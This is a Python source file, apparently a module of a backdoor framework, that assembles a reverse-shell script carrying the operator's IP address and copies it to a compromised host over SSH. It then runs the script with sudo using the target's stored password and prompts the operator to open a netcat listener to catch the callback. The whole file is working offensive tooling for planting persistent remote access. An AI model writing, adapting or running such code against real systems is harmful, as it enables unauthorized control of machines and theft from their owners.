from backdoor import *

class Pyth(Backdoor):
    prompt = Fore.RED + "(py) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using Python module..."
        self.core = core
        self.options = {
                "port"   : Option("port", 53922, "port to connect to", True),
                }
        self.modules = {}
        self.allow_modules = True
        self.help_text = "" 

    def get_command(self):
        return  "echo " + self.core.curtarget.pword + " | sudo -S nohup python ~/pythBackdoor.py"

    def do_exploit(self, args):
        port = self.get_value("port")
        target = self.core.curtarget
        toW = 'backdoors/pythScript/pythBackdoor.py'
        stringToAdd = ""
        fileToWrite = open(toW, 'w')

        with open ("backdoors/pythScript/pythPart1", "r") as myfile:
            data=myfile.read()
        data = data[:-1]#remove the last new line character.
        stringToAdd+=data + self.core.localIP
    
        with open ("backdoors/pythScript/pythPart2", "r") as myfile:
            data=myfile.read()
        stringToAdd+=data
        fileToWrite.write(stringToAdd)
        fileToWrite.close()
        raw_input("Run the following command: nc -v -n -l -p %s in another shell." % port)
        target.ssh.exec_command('rm pythBackdoor.py')
        target.scpFiles(self, 'backdoors/pythScript/pythBackdoor.py', False)
        print(GOOD + "Moving the backdoor script.")
        target.ssh.exec_command(self.get_command())
        print(GOOD + "Python backdoor on %s attempted." % port)

        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit() 

